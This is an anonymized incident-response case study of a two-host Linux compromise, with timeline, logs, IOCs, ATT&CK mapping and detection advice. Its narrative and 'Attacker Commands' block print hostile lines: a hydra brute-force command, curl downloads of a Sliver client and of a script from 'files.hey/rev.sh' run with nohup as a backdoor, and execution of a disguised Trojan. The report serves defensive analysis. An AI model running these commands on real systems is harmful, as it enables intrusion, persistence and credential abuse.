🛡 Demo Case: Multi-Stage Compromise (Anonymized)
📌 Executive Summary

This case shows a multi-stage compromise across two Linux servers (10.0.0.7 and 10.0.0.6).
The attacker first created unauthorized accounts and deployed Sliver C2 on Host A.
They then brute-forced FTP on Host B, pivoted via SSH, deployed a custom backdoor (UPSET_RHYTHM), executed a disguised Trojan (vsftpd.jpg), and attempted anti-forensics with container tampering (runc delete --force).

🎯 Outcome: confirmed C2 activity, lateral movement, brute-force credential abuse, persistence, and cleanup attempts.

___________________________________________________________________________________________________________________________________________________


🖼 Attack Flow (ASCII Diagram)

                   +-------------------+
                   |  External Attacker|
                   +-------------------+
                            |
                            v
                   +-------------------+
                   | Host A (10.0.0.7) |
                   +-------------------+
                      |         |
       curl Sliver    |         | hydra brute-force FTP
         +            |         v
         |            |   +-------------------+
         |            |   | Host B (10.0.0.6) |
         |            |   +-------------------+
         |            |           |
         |            |           ├── 🟢 nohup ./UPSET_RHYTHM & (persistence)
         |            |           ├── 🔴 exec ./vsftpd.jpg (Trojan)
         |            |           ├── 🟡 gobuster dir … (recon)
         |            |           └── 🟡 runc delete --force (tampering)
         |
   Unauthorized user (ubuntu)
   Sliver C2 channel established
   SSH pivot as cooluser

___________________________________________________________________________________________________________________________________________________


📖 Attack Narrative

🥷 Stage 1 – Foothold on Host A (10.0.0.7)

🔴 useradd ubuntu → unauthorized user creation.

🔴 curl -sL … sliver-client_linux → downloaded Sliver C2.

🔴 chmod +x sliver-client_linux → execution prepared.

🔴 Sliver C2 beacon established (IP: 8.19.235.12).


🛠 Stage 2 – Credential Access & Pivot

🟡 hydra -l root -P 10k-most-common.txt ftp://10.0.0.6 → brute-force against FTP.

🟡 SSH pivot → first activity as cooluser on 10.0.0.6.


💥 Stage 3 – Post-Exploitation on Host B (10.0.0.6)

🟢 curl -s http://files.hey/rev.sh -o UPSET_RHYTHM.

🟢 chmod +x ./UPSET_RHYTHM && nohup ./UPSET_RHYTHM &.

🔴 chmod +x ./vsftpd.jpg && ./vsftpd.jpg → Trojan executed (SHA256: df49bf53747253c382de544fdf4f2fd17b586acc17cb81cf4c4168c535322609).

🟡 gobuster dir -u http://localhost … → recon of internal service.

🟡 runc delete --force → container tampering / anti-forensics.
---

___________________________________________________________________________________________________________________________________________________


⏱️ Timeline (UTC)


| Time (UTC) | Event                                                              |
| ---------- | ------------------------------------------------------------------ |
| 19:08:32   | 🔴 `useradd ubuntu` (10.0.0.7)                                     |
| 19:10:04   | 🔴 `curl` download sliver-client\_linux                            |
| 19:13:17   | 🔴 `chmod +x sliver-client_linux`                                  |
| 19:17:51   | 🟡 `runc delete --force` executed on 10.0.0.6 by root              |
| 19:24:52   | 🟡 Hydra brute-force FTP attempt from 10.0.0.7 → 10.0.0.6          |
| 19:49:35   | 🟡 First command observed from user `cooluser` on 10.0.0.6         |
| 19:58:12   | 🟢 root curl → download `UPSET_RHYTHM`                             |
| 19:58:32   | 🟢 `chmod +x ./UPSET_RHYTHM`                                       |
| 19:59:03   | 🟢 `nohup ./UPSET_RHYTHM &`                                        |
| 20:03:37   | 🔴 `chmod +x ./vsftpd.jpg`                                         |
| 20:03:38   | 🔴 `./vsftpd.jpg` executed (Trojan, VirusTotal: 30+ AV detections) |
| 20:04:01   | 🟡 `gobuster dir -u http://localhost …`                            |

___________________________________________________________________________________________________________________________________________________


📂 Artifacts (Synthetic / Anonymized)


Host A (10.0.0.7 – Initial C2):

{
  "time": "2025-07-14T19:10:04Z",
  "user": "root",
  "process": "curl -sL https://github.com/.../sliver-client_linux -o sliver-client_linux",
  "srcIP": "8.19.235.12"
}

Host B (10.0.0.6 – UPSET_RHYTHM):

{
  "time": "2025-07-14T19:59:03Z",
  "user": "root",
  "process": "nohup ./UPSET_RHYTHM &",
  "cwd": "/tmp",
  "persistence": true
}

Malware Execution:

{
  "time": "2025-07-14T20:03:38Z",
  "user": "root",
  "file": "vsftpd.jpg",
  "sha256": "df49bf53747253c382de544fdf4f2fd17b586acc17cb81cf4c4168c535322609",
  "detection": "Trojan.Sliver (30+ AV engines)"
}

Recon (Gobuster):

{
  "time": "2025-07-14T20:04:01Z",
  "user": "root",
  "command": "gobuster dir -u http://localhost -w /usr/share/wordlists/",
  "target": "local web service"
}

___________________________________________________________________________________________________________________________________________________


💻 Attacker Commands (Reconstructed, Synthetic)


# 🟡 Foothold
useradd ubuntu
curl -sL https://github.com/BishopFox/sliver/releases/download/v1.5.30/sliver-client_linux -o sliver-client_linux
chmod +x sliver-client_linux

# 🟡 Credential Access
hydra -l root -P 10k-most-common.txt ftp://10.0.0.6

# 🟢 Lateral Pivot (SSH as cooluser)
ssh cooluser@10.0.0.6

# 🟢 Payload & Persistence
curl -s http://files.hey/rev.sh -o UPSET_RHYTHM
chmod +x ./UPSET_RHYTHM
nohup ./UPSET_RHYTHM &

# 🔴 Malware Execution
chmod +x ./vsftpd.jpg
./vsftpd.jpg

# 🟡 Recon & Anti-Forensics
gobuster dir -u http://localhost -w /usr/share/wordlists/
runc delete --force

___________________________________________________________________________________________________________________________________________________


🧾 IOCs (Synthetic)

| Type       | Value                                                                                 | Source        | Status      |
| ---------- | ------------------------------------------------------------------------------------- | ------------- | ----------- |
| 🌐 IP      | 8.19.235.12                                                                           | Host A logs   | C2 / Sliver |
| 👤 Users   | ubuntu, cooluser                                                                      | Syslog / Auth | Rogue       |
| 🛠 Binary  | sliver-client\_linux                                                                  | File artifact | Malicious   |
| 🛠 Binary  | vsftpd.jpg (SHA256: df49bf53747253c382de544fdf4f2fd17b586acc17cb81cf4c4168c535322609) | VirusTotal    | Trojan      |
| ⚙️ Tooling | curl, chmod, hydra, runc, gobuster                                                    | Process logs  | Abused      |
| Script     | UPSET\_RHYTHM (downloaded from [http://files.hey/rev.sh](http://files.hey/rev.sh))    | Root activity | Malicious   |

___________________________________________________________________________________________________________________________________________________


🔑 Key Findings


🔴 Foothold: unauthorized users (ubuntu, cooluser).

🔴 C2: Sliver client retrieved & prepared.

🟡 Brute-force: hydra FTP attempts.

🟡 Pivot: SSH access as cooluser.

🟢 Persistence: UPSET_RHYTHM + nohup.

🔴 Malware: Trojan disguised as vsftpd.jpg.

🟡 Recon: gobuster enumeration.

🟡 Tampering: runc delete --force (container cleanup).

___________________________________________________________________________________________________________________________________________________


🗂️ MITRE ATT&CK Mapping


T1136 – Create Account (ubuntu, cooluser)

T1110 – Brute Force (hydra)

T1021.004 – SSH (pivot)

T1059 – Command Shell (sliver-client_linux execution)

T1053 – Scheduled/Background Task (nohup persistence)

T1071 – Application Layer Protocol (Sliver C2)

T1046 – Network Service Scanning (gobuster)

T1070/T1562 – Indicator Removal / Impair Defenses (runc delete)

___________________________________________________________________________________________________________________________________________________


👀 Detection Use Cases


🚨 Alert on unexpected useradd by root.

🚨 Detect curl→chmod→exec chain in /tmp.

🟡 Flag hydra brute-force attempts.

🟡 Monitor SSH logins by new accounts (e.g., cooluser).

🔴 Detect suspicious binaries (sliver*, vsftpd.jpg).

🟡 Monitor container lifecycle events (runc delete --force).

___________________________________________________________________________________________________________________________________________________

🛡️ Recommendations


Block known IOCs (hashes, IP 8.19.235.12).

Enforce MFA & disable password auth for SSH.

Deploy auditd for execve, useradd, container commands.

Segment access between services (FTP/SSH).

Add SIEM hunts for Sliver/UPSET_RHYTHM patterns.

Review persistence attempts with nohup/background jobs.
